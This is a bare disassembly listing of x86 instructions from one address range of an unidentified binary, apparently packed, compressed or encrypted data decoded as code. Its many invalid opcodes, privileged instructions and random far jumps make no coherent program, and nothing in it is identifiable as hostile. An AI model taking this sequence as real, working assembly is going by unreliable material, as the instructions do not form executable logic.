  410525:	sbb    al,0xeb
  410527:	imul   esp,DWORD PTR [esi],0xffffffcf
  41052a:	mov    cl,0x81
  41052c:	ror    DWORD PTR [eax],1
  41052e:	xchg   esi,eax
  41052f:	adc    al,0xe5
  410531:	xor    eax,0xec2e8940
  410536:	(bad)  
  410537:	je     0x41053a
  410539:	pop    ebp
  41053a:	mov    al,ds:0x9785d515
  41053f:	retf   0xcf83
  410542:	pusha  
  410543:	ss pop ebp
  410545:	nop
  410546:	adc    WORD PTR [edx],sp
  410549:	es mov edi,0xb5ef70f
  41054f:	add    dh,BYTE PTR ss:[ebx]
  410552:	inc    ebx
  410553:	les    ebx,FWORD PTR [ebx-0xff2810b]
  410559:	or     edi,edi
  41055b:	push   esp
  41055c:	iret   
  41055d:	test   BYTE PTR [edx],al
  41055f:	popf   
  410560:	test   DWORD PTR [edi-0x774dfa71],0xd07fe7f0
  41056a:	dec    ebx
  41056b:	das    
  41056c:	data16 aad 0xd5
  41056f:	ins    DWORD PTR es:[edi],dx
  410570:	mov    ebp,0x760642e2
  410575:	jle    0x410595
  410577:	in     eax,0x94
  410579:	retf   0x816c
  41057c:	neg    esp
  41057e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41057f:	xor    BYTE PTR ds:[eax-0x2f619d15],dl
  410586:	dec    edx
  410587:	push   edi
  410588:	mov    bl,0x42
  41058a:	push   ss
  41058b:	push   cs
  41058c:	inc    ebp
  41058d:	ins    BYTE PTR es:[edi],dx
  41058e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058f:	gs dec ecx
  410591:	bound  edi,QWORD PTR [esi-0x7a]
  410594:	xchg   BYTE PTR ds:0xbb8afc70,ah
  41059a:	lds    eax,FWORD PTR [ebx-0x9]
  41059d:	aas    
  41059e:	add    al,0xcb
  4105a0:	push   0x98c2d466
  4105a5:	stc    
  4105a6:	std    
  4105a7:	std    
  4105a8:	mov    esi,0x97cb071c
  4105ad:	enter  0xc559,0x8a
  4105b1:	xor    al,0x7b
  4105b3:	mov    DWORD PTR [ebp+ebp*4-0xe74f8f4],ecx
  4105ba:	shl    DWORD PTR [edx+0x13d998c2],0x14
  4105c1:	clc    
  4105c2:	(bad)  
  4105c3:	je     0x41056a
  4105c5:	or     al,0xf
  4105c7:	push   es
  4105c8:	test   BYTE PTR [esi],bh
  4105ca:	fimul  WORD PTR [eax-0x5f50a75a]
  4105d0:	sar    BYTE PTR [edx-0x5fe05fd9],cl
  4105d6:	dec    esp
  4105d7:	ret    0x405a
  4105da:	mov    BYTE PTR ds:[ecx-0x45bfb1e9],bh
  4105e1:	(bad)  
  4105e2:	in     eax,dx
  4105e3:	jle    0x410641
  4105e5:	rcr    DWORD PTR [ebx+0x3cc5d978],0xe7
  4105ec:	rcl    DWORD PTR [ecx-0x70cd2b52],1
  4105f2:	jnp    0x4105ad
  4105f4:	inc    edi
  4105f5:	ins    BYTE PTR es:[edi],dx
  4105f6:	jae    0x4105c1
  4105f8:	sub    DWORD PTR [ebp-0x6a9f475b],eax
  4105fe:	inc    esp
  4105ff:	aad    0xf
  410601:	xchg   esp,eax
  410602:	push   eax
  410603:	leave  
  410604:	push   cs
  410605:	iret   
  410606:	sub    al,0x9c
  410608:	(bad)  
  410609:	aas    
  41060a:	mov    ecx,0xb55bbffe
  41060f:	rol    BYTE PTR [ebx-0x58],cl
  410612:	ss mov dh,al
  410615:	xor    bl,cl
  410617:	jg     0x410603
  410619:	pop    ebp
  41061a:	repnz and edi,DWORD PTR [ebx]
  41061d:	cmp    DWORD PTR [edi+0x66ed56d7],ebx
  410623:	test   BYTE PTR [esi+0x5ea27d56],dl
  410629:	jmp    0x6ba52db1
  41062e:	enter  0xa46c,0xd9
  410632:	push   ebp
  410633:	aam    0x6e
  410635:	push   edi
  410636:	push   esi
  410637:	push   ebx
  410638:	mov    ?,WORD PTR cs:[eax+0x74]
  41063c:	mov    ebp,0x45294e69
  410641:	sub    al,0xa3
  410643:	repnz data16 (bad) 
  410646:	into   
  410647:	sbb    BYTE PTR [edx],ch
  410649:	pushf  
  41064a:	jnp    0x4106b5
  41064c:	mov    dl,0x78
  41064e:	or     ebx,DWORD PTR [esi]
  410650:	addr16 mov edi,0x9c03d2fc
  410656:	jne    0x4106b5
  410658:	jg     0x4105eb
  41065a:	inc    eax
  41065b:	xor    eax,0x93ffcaa3
  410660:	add    al,0xa
  410662:	fild   QWORD PTR [edx-0x10b2265b]
  410668:	shl    BYTE PTR [edi+ebx*8+0x76],0x5
  41066d:	sar    BYTE PTR [ebx],0xd3
  410670:	loope  0x41069f
  410672:	out    dx,eax
  410673:	sub    bh,0xc9
  410676:	in     eax,dx
  410677:	mov    edi,0x93f73a5c
  41067c:	arpl   WORD PTR [ecx],bp
  41067e:	adc    edx,DWORD PTR [eax+esi*2-0x80]
  410682:	rol    BYTE PTR [ecx-0x2d7a03a7],0x2d
  410689:	in     al,0xbe
  41068b:	cmp    DWORD PTR [esi],0x6c13b601
  410691:	pop    ds
  410692:	xor    ebx,DWORD PTR [edi-0x56]
  410695:	cmp    bl,BYTE PTR [edx]
  410697:	ret    0xedd9
  41069a:	push   0x73fbbc8a
  41069f:	add    al,0x8a
  4106a1:	add    DWORD PTR [ebx-0x28],ebx
  4106a4:	(bad)  
  4106a5:	int3   
  4106a6:	mov    cl,0xd9
  4106a8:	dec    edi
  4106a9:	sti    
  4106aa:	jns    0x410637
  4106ac:	mov    bh,BYTE PTR ss:[esi+ebx*1]
  4106b0:	fbld   TBYTE PTR [esp+eax*2]
  4106b3:	retf   0x99ef
  4106b6:	cli    
  4106b7:	into   
  4106b8:	lea    ecx,[edi+0xd]
  4106bb:	cdq    
  4106bc:	shr    BYTE PTR [esi+0x51],0xb2
  4106c0:	fdivp  st(2),st
  4106c2:	jecxz  0x41065c
  4106c4:	cmp    al,0x1d
  4106c6:	fiadd  DWORD PTR [ebx-0x4e23043e]
  4106cc:	(bad)  
  4106cd:	(bad)  
  4106cf:	std    
  4106d0:	dec    esp
  4106d1:	neg    DWORD PTR [edx-0x38]
  4106d4:	pop    eax
  4106d5:	shl    BYTE PTR [esi+ebp*8-0x4e],1
  4106d9:	lea    ebx,[ebx+0x60]
  4106dc:	arpl   WORD PTR [ecx+ecx*4-0x75b7e753],ax
  4106e3:	jmp    0x3ef1:0xd80239f3
  4106ea:	mov    ds:0x78bd5fc1,al
  4106ef:	pop    esp
  4106f0:	cmp    dh,BYTE PTR [ebp-0x1]
  4106f3:	ins    BYTE PTR es:[edi],dx
  4106f4:	cmp    al,0x29
  4106f6:	pusha  
  4106f7:	push   0x786e0140
  4106fc:	push   edx
  4106fd:	mov    cl,0x3d
  4106ff:	retf   0xad4a
  410702:	or     ebp,DWORD PTR gs:[edx+0xadf0a06]
  410709:	pop    es
  41070a:	rcr    BYTE PTR [esi-0x7caa8142],0xed
  410711:	(bad)  
  410712:	cmp    al,0x79
  410714:	mov    eax,0xfa7038d3
  410719:	pop    DWORD PTR [edi-0x9]
  41071c:	icebp  
  41071d:	test   DWORD PTR [edi+0x70bbe103],eax
  410723:	cld    
  410724:	jns    0x410749
  410726:	cmp    BYTE PTR [ecx+edx*1+0x65],dl
  41072a:	clc    
  41072b:	add    DWORD PTR [edx+eiz*4-0x68c2c7ec],esi
  410732:	sub    eax,0x20ea47ac
  410737:	fistp  QWORD PTR ds:0x515fb95e
  41073d:	xor    DWORD PTR [ebx+0xe42da97],edi
  410743:	fdiv   DWORD PTR [ebx]
  410745:	test   DWORD PTR [ecx],edx
  410747:	sbb    ecx,DWORD PTR [edx-0x554c2482]
  41074d:	ja     0x41072e
  41074f:	out    0x3,al
  410751:	into   
  410752:	mov    gs,WORD PTR [eax-0x4b676de7]
  410758:	fwait
  410759:	cmp    DWORD PTR [ebp-0x538d80f2],0x51
  410760:	imul   edi,esi,0x2f
  410763:	inc    edx
  410764:	mov    ebx,0x3af1ff3b
  410769:	mov    bh,0x5d
  41076b:	cmp    DWORD PTR [esi-0x15],0xefb019f0
  410772:	icebp  
  410773:	dec    ecx
  410774:	inc    edx
  410775:	mov    al,0x93
  410777:	xlat   BYTE PTR ds:[ebx]
  410778:	xchg   esi,eax
  410779:	and    al,0x40
  41077b:	cmp    al,0x9
  41077d:	pop    ss
  41077e:	jg     0x410720
  410780:	cmp    DWORD PTR [ecx],esi
  410782:	scas   eax,DWORD PTR es:[edi]
  410783:	adc    al,0xb7
  410785:	lock ins BYTE PTR es:[edi],dx
  410787:	cmp    al,BYTE PTR [edi]
  410789:	(bad)
  41078c:	ins    BYTE PTR es:[edi],dx
  41078d:	fwait
  41078e:	jnp    0x41074f
  410790:	push   esp
  410791:	cmp    BYTE PTR [ecx],ch
  410793:	sub    dh,0xd5
  410796:	call   FWORD PTR [ecx-0x3e]
  410799:	jl     0x4107fd
  41079b:	pop    edx
  41079c:	and    ah,ch
  41079e:	repz dec edx
  4107a0:	aam    0xc4
  4107a2:	mov    edx,0x688adabf
  4107a7:	pop    ebx
  4107a8:	mov    ebx,0xda64e4cf
  4107ad:	fwait
  4107ae:	xchg   DWORD PTR [edx],ebx
  4107b0:	cmp    DWORD PTR [edi+0x6a24fd13],edi
  4107b6:	bound  ebp,QWORD PTR [ebp-0x9]
  4107b9:	dec    ecx
  4107ba:	pushf  
  4107bb:	xchg   ebp,eax
  4107bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107bd:	sti    
  4107be:	or     al,0x7e
  4107c0:	mov    edi,0x1d7af96a
  4107c5:	ins    DWORD PTR es:[edi],dx
  4107c6:	fst    QWORD PTR [edi+0x72cb90e2]
  4107cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107cd:	dec    BYTE PTR [eax-0x5d]
  4107d0:	pop    ds
  4107d1:	mov    edi,0xcfb3d9a2
  4107d6:	iret   
  4107d7:	dec    edi
  4107d8:	(bad)  
  4107d9:	pop    edx
  4107da:	sar    BYTE PTR [edx-0x73c15f34],1
  4107e0:	push   ebp
  4107e1:	and    eax,ecx
  4107e3:	inc    esp
  4107e4:	mov    esi,0x2cadd671
  4107e9:	add    esp,DWORD PTR [eax+edi*1+0x7c3b76a4]
  4107f0:	or     al,0x57
  4107f2:	push   ss
  4107f3:	pop    es
  4107f4:	enter  0x4824,0x88
  4107f8:	lods   eax,DWORD PTR ds:[esi]
  4107f9:	call   0x7adb:0xeb4632b6
  410800:	pop    ebx
  410801:	dec    edx
  410802:	and    bl,dl
  410804:	daa    
  410805:	mov    ebx,DWORD PTR [ecx+eax*2]
  410808:	push   ss
  410809:	cmp    al,0x6f
  41080b:	pop    es
  41080c:	xor    DWORD PTR [esi-0x69699b55],edx
  410812:	xchg   ebx,eax
  410813:	ret    0xb2fb
  410816:	xor    esi,DWORD PTR [eax]
  410818:	popf   
  410819:	mov    esi,0x64ca9cc2
  41081e:	mov    ebp,0xacef0d2e
  410823:	popf   
  410824:	xchg   ebp,eax
  410825:	fist   WORD PTR [edx+edi*2]
  410828:	and    BYTE PTR [esp+eax*2+0x144eabc4],al
  41082f:	fisttp WORD PTR [ecx+0x1759c872]
  410835:	loope  0x41085e
  410837:	mov    bl,0x60
  410839:	repz xor ecx,edx
  41083c:	(bad)  
  41083d:	adc    eax,0xbadee04f
  410842:	pop    es
  410843:	adc    edx,ebp
  410845:	and    BYTE PTR [edi-0x78],cl
  410848:	sub    al,BYTE PTR [esp+ebp*1]
  41084b:	int    0xc2
  41084d:	sar    BYTE PTR [ebx],0x39
  410850:	retf   
  410851:	retf   0x98e8
  410854:	ss pcmpgtd mm7,mm0
  410858:	mov    edi,0x1d8aa60c
  41085d:	ret    0xfef5
  410860:	(bad)  
  410862:	imul   ebx,DWORD PTR [edi+0x44be3b71],0xd6b8b4a5
  41086c:	imul   BYTE PTR [ebp+0x6c]
  41086f:	(bad)  
  410870:	loope  0x41085a
  410872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410873:	pop    esp
  410874:	xchg   esp,eax
  410875:	es mov ah,0xff
  410878:	sbb    eax,0xd8085c81
  41087d:	jl     0x410809
  41087f:	dec    DWORD PTR [eax+edx*4+0xf11bd6]
  410886:	loopne 0x410861
  410888:	ret    0x2ddb
  41088b:	cmp    al,0x31
  41088d:	rcl    BYTE PTR [edx+ebp*8+0x3c],0x55
  410892:	out    0x55,eax
  410894:	inc    ecx
  410895:	dec    edx
  410896:	clc    
  410897:	iret   
  410898:	pushf  
  410899:	adc    ah,BYTE PTR [ecx-0x5376d2c4]
  41089f:	sbb    eax,0x1b1e108c
  4108a4:	dec    eax
  4108a5:	scas   eax,DWORD PTR es:[edi]
  4108a6:	sub    eax,0x758832f3
  4108ab:	pop    esi
  4108ac:	fild   QWORD PTR [esp+ebx*4-0x14]
  4108b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108b1:	xlat   BYTE PTR ds:[ebx]
  4108b2:	cdq    
  4108b3:	xchg   esp,eax
  4108b4:	xchg   ebp,eax
  4108b5:	pop    ebx
  4108b6:	mov    al,ds:0x2195be02
  4108bb:	je     0x41090e
  4108bd:	scas   al,BYTE PTR es:[edi]
  4108be:	(bad)  
  4108bf:	inc    ebp
  4108c0:	and    BYTE PTR [eax+0x30],al
  4108c3:	xor    BYTE PTR [eax],0xb7
  4108c6:	sub    al,BYTE PTR [ebp+0x2a]
  4108c9:	arpl   WORD PTR [ecx-0x38],si
  4108cc:	in     al,dx
  4108cd:	mov    WORD PTR [edx-0x7305908c],ss
  4108d3:	pop    ss
  4108d4:	js     0x4108fc
  4108d6:	jle    0x41094e
  4108d8:	inc    eax
  4108d9:	std    
  4108da:	jp     0x410861
  4108dc:	mov    eax,ds:0x8cf1513d
  4108e1:	mov    ds:0xa7bea6a6,al
  4108e6:	in     eax,0x99
  4108e8:	mov    ebx,DWORD PTR [ecx+0xa419fed]
  4108ee:	iret   
  4108ef:	pop    ss
  4108f0:	mov    cl,0xee
  4108f2:	pop    esi
  4108f3:	mov    DWORD PTR [ebp+0x4f],esp
  4108f6:	daa    
  4108f7:	lea    edx,[ecx+0x75]
  4108fa:	(bad)  
  4108fb:	inc    ebp
  4108fc:	jnp    0x410979
  4108fe:	(bad)  
  4108ff:	jne    0x41097e
  410901:	and    BYTE PTR [edx],dl
  410903:	ins    BYTE PTR es:[edi],dx
  410904:	or     DWORD PTR [ebx],edi
  410906:	cmp    eax,DWORD PTR [ebx+edi*4]
  410909:	jmp    0x410919
  41090b:	mov    bl,0xdc
  41090d:	mov    ecx,0xc4971b36
  410912:	test   ch,0xc1
  410915:	xchg   edx,eax
  410916:	push   edi
  410917:	xchg   esi,edi
  410919:	xor    bh,bl
  41091b:	idiv   DWORD PTR [esi+0x7761f948]
  410921:	jo     0x41096c
  410923:	pusha  
  410924:	mov    ?,WORD PTR [esi-0x6b0cb755]
  41092a:	fld    QWORD PTR [edi]
  41092c:	dec    esp
  41092d:	rcr    DWORD PTR [edi],1
  41092f:	sbb    eax,0x29b85ba9
  410934:	sub    esp,DWORD PTR [esi-0x1880b628]
  41093a:	jl     0x4109a7
  41093c:	jle    0x4109a7
  41093e:	xor    al,0xb4
  410940:	nop
  410941:	stos   BYTE PTR es:[edi],al
  410942:	jmp    0x3fd11c14
  410947:	push   es
  410948:	cli    
  410949:	out    0x88,al
  41094b:	fwait
  41094c:	sub    esi,edi
  41094e:	mov    ds:0x41a5c73b,al
  410953:	add    esi,DWORD PTR [ebx-0x29]
  410956:	loopne 0x410932
  410958:	adc    al,0x85
  41095a:	mov    bl,BYTE PTR [esi+0x4fc153c9]
  410960:	scas   eax,DWORD PTR es:[edi]
  410961:	add    eax,0xc1d5a3
  410966:	adc    DWORD PTR [ebx+0x3dc61f8e],esp
  41096c:	jmp    0x41099c
  41096e:	mov    al,ds:0x6bd5c009
  410973:	cmp    bl,bh
  410975:	(bad)  
  410977:	call   0xd79b0476
  41097c:	iret   
  41097d:	mov    fs,WORD PTR [ebp+0x4eaada80]
  410983:	xchg   esi,eax
  410984:	pusha  
  410985:	data16 scas al,BYTE PTR es:[edi]
  410987:	jle    0x4109b6
  410989:	cld    
  41098a:	rcl    BYTE PTR [ecx-0x5d8bb298],cl
  410990:	add    al,0x83
  410992:	add    BYTE PTR [ebx-0x29],bh
  410995:	outs   dx,DWORD PTR ds:[esi]
  410996:	fwait
  410997:	adc    al,0xf6
  410999:	jno    0x41092c
  41099b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41099c:	scas   eax,DWORD PTR es:[edi]
  41099d:	sub    dh,al
  41099f:	lods   al,BYTE PTR ds:[esi]
  4109a0:	pop    edi
  4109a1:	(bad)  
  4109a3:	popa   
  4109a4:	sbb    al,0x76
  4109a6:	(bad)  
  4109a7:	mov    WORD PTR [ebp+eiz*4-0x46774205],?
  4109ae:	jp     0x41095c
  4109b0:	jmp    0xd698:0x5d12577d
  4109b7:	adc    al,0x57
  4109b9:	mov    esp,0x5a47478a
  4109be:	push   cs
  4109bf:	or     al,BYTE PTR [edi]
  4109c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109c2:	fstp   QWORD PTR [ecx+0x5f]
  4109c5:	dec    ebp
  4109c6:	add    al,0xfd
  4109c8:	loop   0x410a28
  4109ca:	dec    eax
  4109cb:	std    
  4109cc:	sub    DWORD PTR [edi],0x30d6e6d9
  4109d2:	adc    BYTE PTR [edx+0x786c3daa],0x56
  4109d9:	mov    al,ds:0xfe5d8d41
  4109de:	inc    ecx
  4109df:	aam    0x81
  4109e1:	fistp  WORD PTR [edx-0x3d]
  4109e4:	pop    ds
  4109e5:	jae    0x4109eb
  4109e7:	out    0xf5,eax
  4109e9:	inc    ecx
  4109ea:	imul   ebp,DWORD PTR [ecx-0x4c],0x7650b60e
  4109f1:	sbb    DWORD PTR [esi+0x72c02bb0],esp
  4109f7:	inc    ebp
  4109f8:	stc    
  4109f9:	nop
  4109fa:	push   esi
  4109fb:	ins    DWORD PTR es:[edi],dx
  4109fc:	les    ecx,FWORD PTR [si+0x4126]
  410a01:	mov    edi,0x9d382bea
  410a06:	int    0x95
  410a08:	jle    0x410a0e
  410a0a:	cdq    
  410a0b:	ins    BYTE PTR es:[edi],dx
  410a0c:	fld    DWORD PTR [ecx+0x62a20ab3]
  410a12:	and    ebp,DWORD PTR [ebx-0x5e]
  410a15:	push   ebp
  410a16:	cdq    
  410a17:	in     eax,0xfc
  410a19:	mov    esi,0xd93a5bcc
  410a1e:	xchg   edx,eax
  410a1f:	aam    0x6
  410a21:	jnp    0x4109ce
  410a23:	mov    gs,WORD PTR [esi]
  410a25:	inc    ebx
  410a26:	adc    eax,0x8757bbf
  410a2b:	(bad)  
  410a2c:	push   ecx
  410a2d:	mov    ds:0x5b3a9776,al
  410a32:	inc    edx
  410a33:	sar    esi,0x4e
  410a36:	out    0x2a,al
  410a38:	(bad)  
  410a39:	add    esp,DWORD PTR [ebp+0x73]
  410a3c:	dec    eax
  410a3d:	sbb    bl,ah
  410a3f:	xchg   cl,cl
  410a41:	add    DWORD PTR [esi],esi
  410a43:	xchg   edx,eax
  410a44:	inc    ebp
  410a45:	stos   BYTE PTR es:[edi],al
  410a46:	cdq    
  410a47:	test   eax,0x816553ed
  410a4c:	dec    DWORD PTR [esi+esi*1+0x5ca9a709]
  410a53:	xor    eax,esp
  410a55:	mov    al,ds:0xf9fca6ca
  410a5a:	mov    ds:0xdf5cfc58,al
  410a5f:	cmp    al,0x12
  410a61:	mov    ecx,0xb9566485
  410a66:	cli    
  410a67:	xlat   BYTE PTR ds:[ebx]
  410a68:	rcl    DWORD PTR [ecx+ebx*8+0x5c2be6bc],0x4a
  410a70:	or     DWORD PTR [ebx],ebx
  410a72:	jecxz  0x410a91
  410a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a75:	dec    edi
  410a76:	inc    eax
  410a77:	mov    edi,0xcda4262d
  410a7c:	fstp   QWORD PTR [ecx]
  410a7e:	jecxz  0x410aeb
  410a80:	xchg   BYTE PTR [esi-0x3a98870d],bl
  410a86:	xor    DWORD PTR [ebp+eiz*2-0x52246981],esp
  410a8d:	(bad)  
  410a8e:	mov    esi,0xd98fce09
  410a93:	(bad)  
  410a94:	(bad)
  410a97:	je     0x410a90
  410a99:	jb     0x410ac2
  410a9b:	mov    eax,0xe8098b16
  410aa0:	and    al,0xb4
  410aa2:	scas   eax,DWORD PTR es:[edi]
  410aa3:	and    ebx,DWORD PTR [eax]
  410aa5:	sbb    eax,0x8ea11ed0
  410aaa:	sub    eax,DWORD PTR [ebp-0x1]
  410aad:	nop
  410aae:	cmp    al,0x8e
  410ab0:	adc    DWORD PTR ds:0xbd07b98b,ebp
  410ab6:	pop    ss
  410ab7:	jmp    0x43f6:0x7fc9f21a
  410abe:	mov    edi,0x740031ba
  410ac3:	pop    eax
  410ac4:	leave  
  410ac5:	xchg   ebx,eax
  410ac6:	push   es
  410ac7:	inc    edx
  410ac8:	sub    esi,DWORD PTR [esi-0x2d]
  410acb:	push   0xc0d701ce
  410ad0:	add    al,0x28
  410ad2:	(bad)  
  410ad3:	xor    dl,cl
  410ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ad6:	dec    esi
  410ad7:	pop    ss
  410ad8:	or     ah,dh
  410ada:	mov    edi,0x6c58fcd5
  410adf:	ja     0x410b3b
  410ae1:	mov    eax,ds:0x87d3ff72
  410ae6:	xchg   ecx,eax
  410ae7:	pusha  
  410ae8:	icebp  
  410ae9:	repnz xor eax,0x813873ba
  410aef:	pop    edx
  410af0:	icebp  
  410af1:	jecxz  0x410aa3
  410af3:	sar    DWORD PTR [ebp+0x18],1
  410af6:	xor    eax,0x1d9904cb
  410afb:	aam    0x3b
  410afd:	dec    ebx
  410afe:	test   eax,0xc7cf6f56
  410b03:	scas   al,BYTE PTR es:[edi]
  410b04:	sbb    eax,0xed1e43c3
  410b09:	dec    eax
  410b0a:	repnz stos BYTE PTR es:[edi],al
  410b0c:	pop    esi
  410b0d:	and    DWORD PTR [edi],eax
  410b0f:	mov    esi,0x89d70b39
  410b14:	jle    0x410af3
  410b16:	jge    0x410acb
  410b18:	dec    eax
  410b19:	adc    al,0xe7
  410b1b:	pop    eax
  410b1c:	fsub   DWORD PTR [edx+0x56eb12e1]
  410b22:	iret   
  410b23:	inc    ebx
  410b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b25:	xor    ch,BYTE PTR [esi-0x1cac2ddf]
  410b2b:	and    esi,DWORD PTR [edx-0x72]
  410b2e:	clc    
  410b2f:	lods   al,BYTE PTR ds:[esi]
  410b30:	xchg   ecx,eax
  410b31:	jb     0x410b12
  410b33:	mov    bh,0x30
  410b35:	dec    esp
  410b36:	bound  ecx,QWORD PTR [edi+0x75]
  410b39:	add    al,0xd5
  410b3b:	mov    ebx,0x6620b438
  410b40:	fist   WORD PTR [ecx+0x1d]
  410b43:	ud2    
  410b45:	loope  0x410afc
  410b47:	sbb    BYTE PTR [esi],ch
  410b49:	(bad)  
  410b4b:	jle    0x410afc
  410b4d:	je     0x410b7a
  410b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b50:	push   ds
  410b51:	into   
  410b52:	add    eax,0x849acabb
  410b57:	call   0xb29ac65d
  410b5c:	xchg   BYTE PTR [esi-0x74fdeaf7],ch
  410b62:	dec    ebx
  410b63:	adc    ebx,esp
  410b65:	xor    BYTE PTR [edx+edx*8+0x75],bl
  410b69:	add    ch,BYTE PTR [edx+ebx*8]
  410b6c:	fs and al,bh
  410b6f:	stc    
  410b70:	hlt    
  410b71:	jbe    0x410ba9
  410b73:	shr    BYTE PTR [esi-0x1e],1
  410b76:	or     esp,DWORD PTR [ebx-0x1d]
  410b79:	inc    ebp
  410b7a:	aaa    
  410b7b:	jns    0x410be3
  410b7d:	test   eax,0xecb0b404
  410b82:	fs aad 0x13
  410b85:	xor    eax,DWORD PTR [edx+edx*8]
  410b88:	repz inc eax
  410b8a:	cmp    eax,0xc2d570c3
  410b8f:	inc    ebx
  410b90:	adc    al,0xfd
  410b92:	add    al,BYTE PTR [edx]
  410b94:	call   0x314c8d55
  410b99:	inc    eax
  410b9a:	popa   
  410b9b:	cdq    
  410b9c:	pop    eax
  410b9d:	cmp    eax,0x7aa81eba
  410ba2:	(bad)  
  410ba3:	iret   
  410ba4:	xchg   esi,eax
  410ba5:	call   0x2a27:0x28b62614
  410bac:	test   DWORD PTR ds:0xc5e20ec6,eax
  410bb2:	inc    eax
  410bb3:	inc    esp
  410bb4:	mov    ecx,0x1f213f60
  410bb9:	sbb    edx,eax
  410bbb:	stos   BYTE PTR es:[edi],al
  410bbc:	mov    bh,0x31
  410bbe:	lock ret 0x2ebe
  410bc2:	mov    BYTE PTR [ecx+0x266e2d24],dh
  410bc8:	test   eax,0x8ab07d5f
  410bcd:	js     0x410b5f
  410bcf:	mov    cl,0x3c
  410bd1:	cmp    eax,0x9766140b
  410bd6:	or     eax,0xb2bbdac5
  410bdb:	je     0x410c20
  410bdd:	pop    esp
  410bde:	(bad)  
  410bdf:	fisttp WORD PTR [esi]
  410be1:	pop    edi
  410be2:	xchg   ebx,eax
  410be3:	hlt    
  410be4:	mov    dh,0xe7
  410be6:	imul   edx,DWORD PTR [edx+ebp*8-0x2390c7d3],0x9a0dd96f
  410bf1:	cdq    
  410bf2:	test   BYTE PTR [esi],al
  410bf4:	test   ebp,ebp
  410bf6:	rol    bl,cl
  410bf8:	ss xor ah,cl
  410bfb:	dec    esp
  410bfc:	es cdq 
  410bfe:	xchg   esp,eax
  410bff:	pop    ebx
  410c00:	pop    ds
  410c01:	pop    ecx
  410c02:	ret    
  410c03:	adc    DWORD PTR [esi+esi*2-0x43d88766],0xffffffdb
  410c0b:	jecxz  0x410c59
  410c0d:	mov    edi,esp
  410c0f:	imul   esi,ebp,0xee083d70
  410c15:	out    0x24,al
  410c17:	dec    ecx
  410c18:	adc    BYTE PTR [edi+0x8602ce],al
  410c1e:	adc    dh,BYTE PTR [edx]
  410c20:	cmp    esp,DWORD PTR [eax+0x1c058270]
  410c26:	lods   al,BYTE PTR fs:[esi]
  410c28:	aad    0xb6
  410c2a:	pop    edi
  410c2b:	lods   eax,DWORD PTR ds:[esi]
  410c2c:	mov    bh,al
  410c2e:	push   ss
  410c2f:	xlat   BYTE PTR ds:[ebx]
  410c30:	push   0x21d65721
  410c35:	sbb    al,0x60
  410c37:	xor    DWORD PTR [esi-0x2],ebx
  410c3a:	jne    0x410c30
  410c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3d:	xchg   esp,eax
  410c3e:	repnz xchg ebp,eax
  410c40:	das    
  410c41:	test   eax,0x4c0d3267
  410c46:	lds    ebx,FWORD PTR [ebx]
  410c48:	mov    eax,0x3989091f
  410c4d:	clc    
  410c4e:	aam    0xf0
  410c50:	je     0x410c38
  410c52:	vpcmpgtb xmm0,xmm1,XMMWORD PTR [esi+0x162fbd14]
  410c5a:	arpl   WORD PTR [edi+edx*8+0x5f789a2],bx
  410c61:	mov    eax,0x62fe3375
  410c66:	div    BYTE PTR [edi]
  410c68:	or     al,0x61
  410c6a:	and    al,dl
  410c6c:	or     DWORD PTR [ecx+0x6bacb208],0x75
  410c73:	loope  0x410c02
  410c75:	stos   DWORD PTR es:[edi],eax
  410c76:	cmp    eax,0xdd603397
  410c7b:	sub    eax,0x59a941ca
  410c80:	nop
  410c81:	push   cs
  410c82:	test   al,0xba
  410c84:	and    DWORD PTR [eax+0x1e4e772f],esp
  410c8a:	jp     0x410c49
  410c8c:	js     0x410c12
  410c8e:	outs   dx,BYTE PTR ds:[esi]
  410c8f:	repz xlat BYTE PTR fs:[ebx]
  410c92:	iret   
  410c93:	mov    WORD PTR [edi],?
  410c95:	(bad)  
  410c97:	xchg   BYTE PTR [edi+0xc],ch
  410c9a:	adc    al,0xff
  410c9c:	cs jae 0x410cc7
  410c9f:	in     al,0xef
  410ca1:	push   cs
  410ca2:	sar    DWORD PTR [edi+ebp*8-0x6b],1
  410ca6:	add    eax,DWORD PTR [esi-0x555d3d19]
  410cac:	lea    ebp,[edx-0x6e]
  410caf:	and    ah,BYTE PTR [eax+0x78b0cc7c]
  410cb5:	sbb    BYTE PTR [edx-0x67e75ba0],ah
  410cbb:	or     cl,BYTE PTR [eax+edi*1+0x34]
  410cbf:	xor    al,0x5
  410cc1:	mov    edi,0xf299401e
  410cc6:	call   0xb93803a3
  410ccb:	ret    0xe76f
  410cce:	stos   DWORD PTR es:[edi],eax
  410ccf:	mov    edi,0x93ebb320
  410cd4:	fcmovne st,st(5)
  410cd6:	les    ecx,FWORD PTR [edx-0x5d6b7520]
  410cdc:	fnstenv ds:0x691d6878
  410ce2:	fcomi  st,st(7)
  410ce4:	ret    0x9cb9
  410ce7:	dec    esi
  410ce8:	jns    0x410cad
  410cea:	inc    edi
  410ceb:	mov    fs,WORD PTR [ecx-0x1236f9e2]
  410cf1:	jno    0x410ca7
  410cf3:	popa   
  410cf4:	cli    
  410cf5:	rol    BYTE PTR [esi],0x8e
  410cf8:	out    0x78,al
  410cfa:	fbld   TBYTE PTR [ecx]
  410cfc:	clc    
  410cfd:	(bad)  
  410cfe:	fcom   QWORD PTR [eax-0x4cf45a03]
  410d04:	je     0x410d62
  410d06:	das    
  410d07:	add    BYTE PTR [eax-0x22f4bbfd],0x73
  410d0e:	inc    edx
  410d0f:	cwde   
  410d10:	jns    0x410ce3
  410d12:	dec    esi
  410d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d14:	bnd jne 0x410cf9
  410d17:	mov    dl,0x1a
  410d19:	aam    0x7f
  410d1b:	gs fcmovbe st,st(5)
  410d1e:	jp     0x410d6b
  410d20:	icebp  
